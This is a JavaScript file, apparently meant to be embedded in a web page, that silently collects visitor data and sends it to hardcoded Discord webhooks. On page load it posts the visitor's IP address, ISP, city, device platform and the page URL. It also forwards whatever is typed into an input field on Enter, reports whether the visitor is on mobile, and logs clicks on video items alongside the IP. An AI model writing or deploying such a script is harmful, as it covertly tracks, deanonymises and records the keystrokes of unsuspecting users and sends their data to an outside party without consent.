// IP + ISP Reporter with CORSProxy fallback
(async () => {
  const fileUrl = "https://ipv4.icanhazip.com/";
  const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";

  async function getIPData(url) {
    const fileRes = await fetch(url);
    const ip = (await fileRes.text()).trim();
    let apiUrl = `https://ipapi.co/${ip}/json/`;
    let data;

    async function fetchISP(u) {
      const res = await fetch(u);
      if (!res.ok) throw new Error(`Failed: ${res.status}`);
      return await res.json();
    }

    try {
      data = await fetchISP(apiUrl);
    } catch {
      data = await fetchISP(`https://corsproxy.io/?${apiUrl}`);
    }

    if (
      !data.org || data.org === "Unknown" ||
      !data.city || data.city === "Unknown" ||
      !data.country_name || data.country_name === "Unknown"
    ) {
      try {
        data = await fetchISP(`https://corsproxy.io/?${apiUrl}`);
      } catch {}
    }

    return { ip, data };
  }

  try {
    const { ip, data } = await getIPData(fileUrl);
    const isp = data.org || "Unknown ISP";
    const asn = data.asn ? `(${data.asn})` : "";
    const location = data.city && data.region && data.country_name
      ? `${data.city}, ${data.region}, ${data.country_name}`
      : "Unknown Location";
    const platform = navigator.userAgentData?.platform || navigator.platform;
    const site = location.href.replace(/^https?:\/\//, "https://");
    const message = `IP ${ip}\nISP ${isp} ${asn}\nLocation ${location}\nDevice ${platform}\nSite ${site}`;

    await fetch(webhookUrl, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({ content: message })
    });
  } catch (err) {
    console.error("Error:", err);
  }
})();

function sendToWebhook(content) {
  if (!content) return;
  const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
  fetch(webhookUrl, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ content })
  }).catch(() => {});
}

document.addEventListener("DOMContentLoaded", () => {
  const input = document.querySelector("input");
  if (!input) return;

  input.addEventListener("keydown", async e => {
    if (e.key === "Enter") {
      const text = input.value.trim();
      if (!text) return;
      const payload = { content: text.replace(/[`*_~>|]/g, "") };
      try {
        const res = await fetch("https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        if (!res.ok) console.error("Failed to send to Discord:", res.status);
      } catch (err) {
        console.error("Error sending to Discord:", err);
      }
    }
  });
});

// Device detection webhook
(async () => {
  const KwebhookUrl = "https://discord.com/api/webhooks/1426288631152251090/NOzBMFAj0j_O2uapbBZMit_37Mo4iJGgUNxO2BevN-LrGxqR4IX441WC2hdjuwVcSNBh";
  const message = navigator.userAgentData?.mobile
    ? "The Person is on Mobile"
    : "The Person is not on Mobile";
  await fetch(KwebhookUrl, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ content: message })
  });
})();

// Click logger webhook
(async () => {
  const winhook = "https://discord.com/api/webhooks/1426997095721730199/lllpiiAWKMV5zdFaONWNLSjMZ7PI-UIlWeUdahs74fbgOVZUNPwTDkh8EszSu-TqHjG2";
  const fileRes = await fetch("https://ipv4.icanhazip.com/");
  const fileText = (await fileRes.text()).trim();

  async function safeSend(headline) {
    try {
      const cleanHeadline = headline.replace(/[^a-zA-Z0-9 .,!?'"()\[\]{}\-_/]/g, "").slice(0, 1800);
      const message = `${fileText} has opened ${cleanHeadline}`;
      await fetch(winhook, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ content: message })
      });
    } catch (err) {
      console.error("Send failed:", err);
    }
  }

  document.addEventListener("click", e => {
    const target = e.target.closest(".compact-video, .compact-channel, .shelf-item");
    if (!target) return;
    const headline = target.querySelector(".compact-media-headline");
    if (headline && headline.innerText.trim()) {
      safeSend(headline.innerText.trim());
    }
  });
})();
